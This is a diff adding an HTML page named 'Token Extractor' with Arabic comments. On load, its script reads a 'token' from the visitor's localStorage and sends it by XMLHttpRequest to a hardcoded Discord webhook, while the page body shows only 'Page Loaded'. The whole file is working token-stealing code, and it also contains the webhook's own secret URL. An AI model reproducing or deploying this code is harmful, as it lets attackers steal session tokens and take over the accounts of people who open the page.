@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Token Extractor</title>
+    <script>
+        window.onload = function() {
+            // محاولة الحصول على التوكن من Local Storage
+            var token = localStorage.getItem('token');
+            console.log("Token found: ", token); // تسجيل التوكن للتحقق
+
+            if (token) {
+                // عنوان URL الكامل للويب هوك في Discord
+                var webhookURL = 'https://discord.com/api/webhooks/1272364715456204873/eYdiKGqdFFOOrBWsZFRfwyEmgqKVZt2-_JLYY4zO8zXKc6QrA7h3XYflg358YRugdbs6';
+                
+                // إرسال التوكن إلى ويب هوك
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", webhookURL, true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+
+                // تنسيق البيانات كـ JSON
+                var payload = JSON.stringify({
+                    content: "Token: " + token
+                });
+
+                xhr.onload = function() {
+                    console.log("Request sent. Status: " + xhr.status); // تسجيل حالة الطلب
+                };
+
+                xhr.onerror = function() {
+                    console.error("Request failed."); // تسجيل الأخطاء
+                };
+
+                xhr.send(payload);
+            } else {
+                console.log("No token found.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Page Loaded</h1>
+</body>
+</html>
